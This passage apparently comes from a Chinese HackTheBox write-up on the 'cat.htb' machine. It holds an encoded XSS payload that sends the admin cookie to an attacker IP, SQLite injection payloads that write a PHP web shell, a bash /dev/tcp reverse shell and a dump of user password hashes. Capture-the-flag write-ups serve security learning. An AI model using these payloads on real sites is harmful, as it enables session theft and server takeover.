<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;x onerror=&quot;&amp;#x66&amp;#x65&amp;#x74&amp;#x63&amp;#x68&amp;#x28&amp;#x27&amp;#x68&amp;#x74&amp;#x74&amp;#x70&amp;#x3a&amp;#x2f&amp;#x2f&amp;#x31&amp;#x30&amp;#x2e&amp;#x31&amp;#x30&amp;#x2e&amp;#x31&amp;#x34&amp;#x2e&amp;#x32&amp;#x35&amp;#x3a&amp;#x38&amp;#x30&amp;#x30&amp;#x30&amp;#x3f&amp;#x63&amp;#x6f&amp;#x6f&amp;#x6b&amp;#x69&amp;#x65&amp;#x3d&amp;#x27&amp;#x2b&amp;#x64&amp;#x6f&amp;#x63&amp;#x75&amp;#x6d&amp;#x65&amp;#x6e&amp;#x74&amp;#x2e&amp;#x63&amp;#x6f&amp;#x6f&amp;#x6b&amp;#x69&amp;#x65&amp;#x29&amp;#x3b<br></code></pre></td></tr></table></figure>

<p>上传，用 burp 抓包, 构造 payload，并开启监听</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/contest.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>cat.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------277959241037631938451543716937<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>23170<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://cat.htb<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://cat.htb/contest.php<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=dme3vsvslluef4d28sgsevpgdh<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br><br><span class="language-step21">----------------------------<span class="hljs-number">-277959241037631938451543716937</span></span><br><span class="language-step21">Content-Disposition: form-<span class="hljs-keyword">data</span>; name=<span class="hljs-string">&quot;cat_name&quot;</span></span><br><span class="language-step21"></span><br><span class="language-step21"><span class="hljs-string">&quot;x onerror=&quot;</span>&amp;<span class="hljs-symbol">#x66</span>&amp;<span class="hljs-symbol">#x65</span>&amp;<span class="hljs-symbol">#x74</span>&amp;<span class="hljs-symbol">#x63</span>&amp;<span class="hljs-symbol">#x68</span>&amp;<span class="hljs-symbol">#x28</span>&amp;<span class="hljs-symbol">#x27</span>&amp;<span class="hljs-symbol">#x68</span>&amp;<span class="hljs-symbol">#x74</span>&amp;<span class="hljs-symbol">#x74</span>&amp;<span class="hljs-symbol">#x70</span>&amp;<span class="hljs-symbol">#x3</span>a&amp;<span class="hljs-symbol">#x2</span>f&amp;<span class="hljs-symbol">#x2</span>f&amp;<span class="hljs-symbol">#x31</span>&amp;<span class="hljs-symbol">#x30</span>&amp;<span class="hljs-symbol">#x2</span>e&amp;<span class="hljs-symbol">#x31</span>&amp;<span class="hljs-symbol">#x30</span>&amp;<span class="hljs-symbol">#x2</span>e&amp;<span class="hljs-symbol">#x31</span>&amp;<span class="hljs-symbol">#x34</span>&amp;<span class="hljs-symbol">#x2</span>e&amp;<span class="hljs-symbol">#x32</span>&amp;<span class="hljs-symbol">#x35</span>&amp;<span class="hljs-symbol">#x3</span>a&amp;<span class="hljs-symbol">#x38</span>&amp;<span class="hljs-symbol">#x30</span>&amp;<span class="hljs-symbol">#x30</span>&amp;<span class="hljs-symbol">#x30</span>&amp;<span class="hljs-symbol">#x3</span>f&amp;<span class="hljs-symbol">#x63</span>&amp;<span class="hljs-symbol">#x6</span>f&amp;<span class="hljs-symbol">#x6</span>f&amp;<span class="hljs-symbol">#x6</span>b&amp;<span class="hljs-symbol">#x69</span>&amp;<span class="hljs-symbol">#x65</span>&amp;<span class="hljs-symbol">#x3</span>d&amp;<span class="hljs-symbol">#x27</span>&amp;<span class="hljs-symbol">#x2</span>b&amp;<span class="hljs-symbol">#x64</span>&amp;<span class="hljs-symbol">#x6</span>f&amp;<span class="hljs-symbol">#x63</span>&amp;<span class="hljs-symbol">#x75</span>&amp;<span class="hljs-symbol">#x6</span>d&amp;<span class="hljs-symbol">#x65</span>&amp;<span class="hljs-symbol">#x6</span>e&amp;<span class="hljs-symbol">#x74</span>&amp;<span class="hljs-symbol">#x2</span>e&amp;<span class="hljs-symbol">#x63</span>&amp;<span class="hljs-symbol">#x6</span>f&amp;<span class="hljs-symbol">#x6</span>f&amp;<span class="hljs-symbol">#x6</span>b&amp;<span class="hljs-symbol">#x69</span>&amp;<span class="hljs-symbol">#x65</span>&amp;<span class="hljs-symbol">#x29</span>&amp;<span class="hljs-symbol">#x3</span>b</span><br><span class="language-step21">----------------------------<span class="hljs-number">-277959241037631938451543716937</span></span><br><span class="language-step21">Content-Disposition: form-<span class="hljs-keyword">data</span>; name=<span class="hljs-string">&quot;age&quot;</span></span><br><span class="language-step21"></span><br><span class="language-step21"><span class="hljs-number">11</span></span><br><span class="language-step21">----------------------------<span class="hljs-number">-277959241037631938451543716937</span></span><br><span class="language-step21">Content-Disposition: form-<span class="hljs-keyword">data</span>; name=<span class="hljs-string">&quot;birthdate&quot;</span></span><br><span class="language-step21"></span><br><span class="language-step21"><span class="hljs-number">0011</span><span class="hljs-number">-01</span><span class="hljs-number">-01</span></span><br><span class="language-step21">----------------------------<span class="hljs-number">-277959241037631938451543716937</span></span><br><span class="language-step21">Content-Disposition: form-<span class="hljs-keyword">data</span>; name=<span class="hljs-string">&quot;weight&quot;</span></span><br><span class="language-step21"></span><br><span class="language-step21"><span class="hljs-number">11</span></span><br><span class="language-step21">----------------------------<span class="hljs-number">-277959241037631938451543716937</span></span><br><span class="language-step21">Content-Disposition: form-<span class="hljs-keyword">data</span>; name=<span class="hljs-string">&quot;cat_photo&quot;</span>; filename=<span class="hljs-string">&quot;cat.jpeg&quot;</span></span><br><span class="language-step21">Content-Type: image/jpeg</span><br><span class="language-step21"></span><br><span class="language-step21">GIF89a;</span><br><span class="language-step21">aaaaaaa</span><br><span class="language-step21">----------------------------<span class="hljs-number">-277959241037631938451543716937</span>--</span><br></code></pre></td></tr></table></figure>

<p>发包, 成功拿到管理员的 cookie</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719145824393.png" srcset="/img/loading.gif" lazyload alt="image-20250719145824393"></p>
<h2 id="立足点"><a href="#立足点" class="headerlink" title="立足点"></a>立足点</h2><p>把拿到的 cookie 替换到浏览器中</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.10.11.53</span> - - <span class="hljs-string">[19/Jul/2025 02:57:58]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /?cookie=PHPSESSID=dg66mtcr1r8vbnb5t3c8n0o218 HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br></code></pre></td></tr></table></figure>

<p>刷新，看到多了一个 Admin 的菜单，我们现在已经是管理员权限了</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719153748349.png" srcset="/img/loading.gif" lazyload alt="image-20250719153748349"></p>
<p>我们回到源码，这里 snyk 审计插件也告诉了我们一处 sql 注入</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719154238622.png" srcset="/img/loading.gif" lazyload alt="image-20250719154238622"></p>
<p>可以看到也很明显，试一次 insert 注入</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719154422649.png" srcset="/img/loading.gif" lazyload alt="image-20250719154422649"></p>
<p>从 config 连接信息中，我们可以知道这是一个 sqlite 数据库</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// Database configuration</span><br><span class="hljs-variable">$db_file</span> = <span class="hljs-string">&#x27;/databases/cat.db&#x27;</span>;<br><br><span class="hljs-comment">// Connect to the database</span><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;sqlite:<span class="hljs-subst">$db_file</span>&quot;</span>);<br>    <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>, PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>);<br>&#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Error: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>我们可以利用 [SQLite Injection - Payloads All The Things](<a target="_blank" rel="noopener" href="https://swisskyrepo.github.io/PayloadsAllTheThings/SQL">https://swisskyrepo.github.io/PayloadsAllTheThings/SQL</a> Injection&#x2F;SQLite Injection&#x2F;#sqlite-remote-code-execution) 这里的 payload 执行命令</p>
<p>先在 admin 添加一个小猫</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250719161243864.png" srcset="/img/loading.gif" lazyload alt="image-20250719161243864" style="zoom: 50%;" />

<p>在 admin 页面就可以看到 accept 请求的位置</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719161420168.png" srcset="/img/loading.gif" lazyload alt="image-20250719161420168"></p>
<p>发包 burp 拦截</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/accept_cat.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>cat.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>19<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://cat.htb<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://cat.htb/admin.php<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=jno38dja2j93e6ode9sme2a8ap<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-apache"><span class="hljs-attribute">catName</span>=<span class="hljs-number">111</span>&amp;catId=<span class="hljs-number">1</span></span><br></code></pre></td></tr></table></figure>

<p>在 catName 处存在注入点</p>
<p>发送 payload</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">catName=111111&#x27;), ((<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> (<span class="hljs-number">1</span>=<span class="hljs-number">1</span>) <span class="hljs-keyword">THEN</span> <span class="hljs-keyword">LIKE</span>(<span class="hljs-string">&#x27;ABC&#x27;</span>,<span class="hljs-built_in">UPPER</span>(HEX(RANDOMBLOB(<span class="hljs-number">30000000</span>)))) <span class="hljs-keyword">ELSE</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">END</span>)) --&amp;catId=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>url 编码</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">catName<span class="hljs-operator">=</span><span class="hljs-number">111111</span><span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%28</span><span class="hljs-variable">%28</span><span class="hljs-variable">%53</span><span class="hljs-variable">%45</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%45</span><span class="hljs-variable">%43</span><span class="hljs-variable">%54</span><span class="hljs-variable">%20</span><span class="hljs-variable">%43</span><span class="hljs-variable">%41</span><span class="hljs-variable">%53</span><span class="hljs-variable">%45</span><span class="hljs-variable">%20</span><span class="hljs-variable">%57</span><span class="hljs-variable">%48</span><span class="hljs-variable">%45</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%20</span><span class="hljs-variable">%28</span><span class="hljs-variable">%31</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%31</span><span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-variable">%54</span><span class="hljs-variable">%48</span><span class="hljs-variable">%45</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%20</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%49</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%45</span><span class="hljs-variable">%28</span><span class="hljs-variable">%27</span><span class="hljs-variable">%41</span><span class="hljs-variable">%42</span><span class="hljs-variable">%43</span><span class="hljs-variable">%27</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%55</span><span class="hljs-variable">%50</span><span class="hljs-variable">%50</span><span class="hljs-variable">%45</span><span class="hljs-variable">%52</span><span class="hljs-variable">%28</span><span class="hljs-variable">%48</span><span class="hljs-variable">%45</span><span class="hljs-variable">%58</span><span class="hljs-variable">%28</span><span class="hljs-variable">%52</span><span class="hljs-variable">%41</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%44</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%4</span>d<span class="hljs-variable">%42</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%28</span><span class="hljs-variable">%33</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%29</span><span class="hljs-variable">%29</span><span class="hljs-variable">%29</span><span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-variable">%45</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%53</span><span class="hljs-variable">%45</span><span class="hljs-variable">%20</span><span class="hljs-variable">%27</span><span class="hljs-variable">%61</span><span class="hljs-variable">%27</span><span class="hljs-variable">%20</span><span class="hljs-variable">%45</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%44</span><span class="hljs-variable">%29</span><span class="hljs-variable">%29</span><span class="hljs-variable">%20</span>--&amp;catId<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>可以明显感受到延时变长</p>
<center>
    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250719163946141.png" srcset="/img/loading.gif" lazyload alt="image-20250719163946141" style="zoom:33%;" />
    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250719164056131.png" srcset="/img/loading.gif" lazyload alt="image-20250719164056131" style="zoom:33%;" />
</center>

<p>我们开始尝试写入 webshell</p>
<p>利用这个 payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">ATTACH DATABASE &#x27;/var/www/lol.php&#x27; AS lol;<br>CREATE TABLE lol.pwn (dataz text);<br>INSERT INTO lol.pwn (dataz) VALUES (&quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;);--<br></code></pre></td></tr></table></figure>

<blockquote>
<p>路径，我们得凭运气和感觉去 fuzz 了，因为项目源码中并没有暴露出绝对路径，这里 fuzz 不到，也就没法了</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">ATTACH DATABASE &#x27;/var/www/cat.htb/lol.php&#x27; AS lol;<br>CREATE TABLE lol.pwn (dataz text);<br>INSERT INTO lol.pwn (dataz) VALUES (&quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;);--<br></code></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">catName=111&#x27;);ATTACH DATABASE &#x27;/var/www/cat.htb/lol.php&#x27; AS lol;</span><br><span class="language-xml">CREATE TABLE lol.pwn (dataz text);</span><br><span class="language-xml">INSERT INTO lol.pwn (dataz) VALUES (&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;);--&amp;catId=1</span><br></code></pre></td></tr></table></figure>

<p>url 编码</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">catName<span class="hljs-operator">=</span><span class="hljs-number">111</span><span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%41</span><span class="hljs-variable">%54</span><span class="hljs-variable">%54</span><span class="hljs-variable">%41</span><span class="hljs-variable">%43</span><span class="hljs-variable">%48</span><span class="hljs-variable">%20</span><span class="hljs-variable">%44</span><span class="hljs-variable">%41</span><span class="hljs-variable">%54</span><span class="hljs-variable">%41</span><span class="hljs-variable">%42</span><span class="hljs-variable">%41</span><span class="hljs-variable">%53</span><span class="hljs-variable">%45</span><span class="hljs-variable">%20</span><span class="hljs-variable">%27</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%68</span><span class="hljs-variable">%74</span><span class="hljs-variable">%62</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%27</span><span class="hljs-variable">%20</span><span class="hljs-variable">%41</span><span class="hljs-variable">%53</span><span class="hljs-variable">%20</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%43</span><span class="hljs-variable">%52</span><span class="hljs-variable">%45</span><span class="hljs-variable">%41</span><span class="hljs-variable">%54</span><span class="hljs-variable">%45</span><span class="hljs-variable">%20</span><span class="hljs-variable">%54</span><span class="hljs-variable">%41</span><span class="hljs-variable">%42</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%45</span><span class="hljs-variable">%20</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%77</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%20</span><span class="hljs-variable">%28</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%7</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%49</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%53</span><span class="hljs-variable">%45</span><span class="hljs-variable">%52</span><span class="hljs-variable">%54</span><span class="hljs-variable">%20</span><span class="hljs-variable">%49</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%54</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%20</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%77</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%20</span><span class="hljs-variable">%28</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%7</span>a<span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-variable">%56</span><span class="hljs-variable">%41</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%55</span><span class="hljs-variable">%45</span><span class="hljs-variable">%53</span><span class="hljs-variable">%20</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%20</span><span class="hljs-variable">%73</span><span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%47</span><span class="hljs-variable">%45</span><span class="hljs-variable">%54</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%27</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%64</span><span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>e<span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%2</span>d<span class="hljs-variable">%2</span>d&amp;catId<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/ling-x5/img/raw/master/image-20250719165120686.png" srcset="/img/loading.gif" lazyload alt="image-20250719165120686" style="zoom:80%;" />

<p>访问 <code>http://cat.htb/lol.php?cmd=whoami</code> </p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719165219211.png" srcset="/img/loading.gif" lazyload alt="image-20250719165219211"></p>
<p>可以反弹 shell 了</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.25/9001 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure>

<p>url 编码的 http 包</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/lol.php?cmd=bash+-c+&quot;bash+-i+&gt;%26+/dev/tcp/10.10.14.25/9001+0&gt;%261&quot;</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>cat.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=jno38dja2j93e6ode9sme2a8ap<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br><br></code></pre></td></tr></table></figure>

<p>成功弹回了 shell</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719170038100.png" srcset="/img/loading.gif" lazyload alt="image-20250719170038100"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们在源码中看到了 database 的路径，先来看看数据库吧</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250719195524391.png" srcset="/img/loading.gif" lazyload alt="image-20250719195524391" style="zoom: 50%;" />

<p>用 <code>.table</code> 查看表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">www-data@cat:/databases$ sqlite3 cat.db <br>sqlite3 cat.db                                                                   <br>.table                                                                           <br>accepted_cats  cats           users<br></code></pre></td></tr></table></figure>

<p>查看 users 表</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs coq">select * from users;<br><span class="hljs-number">1</span>|<span class="hljs-type">axel</span>|<span class="hljs-type">axel2017</span>@gmail.com|<span class="hljs-type">d1bbba3670feb9435c9841e46e60ee2f</span><br><span class="hljs-number">2</span>|<span class="hljs-type">rosa</span>|<span class="hljs-type">rosamendoza485</span>@gmail.com|<span class="hljs-type">ac369922d560f17d6eeb8b2c7dec498c</span><br><span class="hljs-number">3</span>|<span class="hljs-type">robert</span>|<span class="hljs-type">robertcervantes2000</span>@gmail.com|<span class="hljs-type">42846631708f69c00ec0c0a8aa4a92ad</span><br><span class="hljs-number">4</span>|<span class="hljs-type">fabian</span>|<span class="hljs-type">fabiancarachure2323</span>@gmail.com|<span 